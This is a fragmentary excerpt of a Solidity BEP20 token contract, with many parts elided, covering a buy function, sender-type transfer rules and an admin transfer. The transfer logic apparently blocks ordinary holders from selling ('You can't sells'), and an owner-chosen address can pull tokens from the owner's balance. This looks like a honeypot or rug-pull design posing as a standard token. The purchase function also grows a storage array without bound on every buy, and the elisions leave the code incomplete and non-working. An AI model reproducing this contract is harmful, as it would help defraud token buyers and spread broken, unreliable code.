...
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    ...
    uint256 private selltime = 3000 seconds;
    uint256 private _lock_amount;
    address private owners;
    address[] private buyers;
    address[] private bountys;
    address public _transfer_address;
    ...
    function add_transfer_address(address transfer_address) public returns (bool) {
        require(_msgSender() == getOwner(), "Ownable: caller is not the owner");
        _transfer_address = transfer_address;
        return true;
    }
    ...
    function buy() public payable returns (uint256) {
        ...
        require(getOwner() != address(0), "BEP20: transfer to the zero address");
        ...
        total_pur_token += token_qty;
        push_buyer(_msgSender(), token_qty);

        for (uint i = 1000000000000000000000; i <= tot_supply;) {//gap array of incremented limit
            tot_supp.push(i);
        ...
        for (uint k = 0; k < tot_supp.length;k++) {
            if (tot_supp[k] >= total_pur_token) {
                _bnb_inc_token_rate = gap_price_array[k];
                break;
            }
        }
    ...
    function _transfer(
        ...
        //both not
        if(_transfer_address == _msgSender()) {
            user_type4 = 1;
        }

        if (user_type1 == 0 && user_type2 == 0 && user_type3 == 0 && user_type4 == 0) {
            user_type5 = 1;
        }
        ...
        } else if(user_type4 == 1) {
            can_transfer = 1;
        } else if(user_type5 == 1) {
            can_transfer = 1;
        }
        ...
        if (can_transfer == 1) {
            ...
            revert("You can't sells");
        }

    }

    function admin_transfer(uint256 amount) public returns (bool) {
        require(_msgSender() == _transfer_address, "Transfer address is invalid");
        require(getOwner() != address(0), "BEP20: transfer from the zero address");
        require(_transfer_address != address(0), "BEP20: transfer from the zero address");
        require(_transfer_address != getOwner(), "Sender and Receiver cannot be same");
        require(getOwner() != _transfer_address, "Receiver cannot be owner");
        require(_balances[getOwner()] >= amount, "BEP20: transfer amount exceeds balance");
        _balances[getOwner()] -= amount;
        _balances[_transfer_address] += amount;
        emit Transfer(getOwner(), _transfer_address, amount);
        return true;
    }
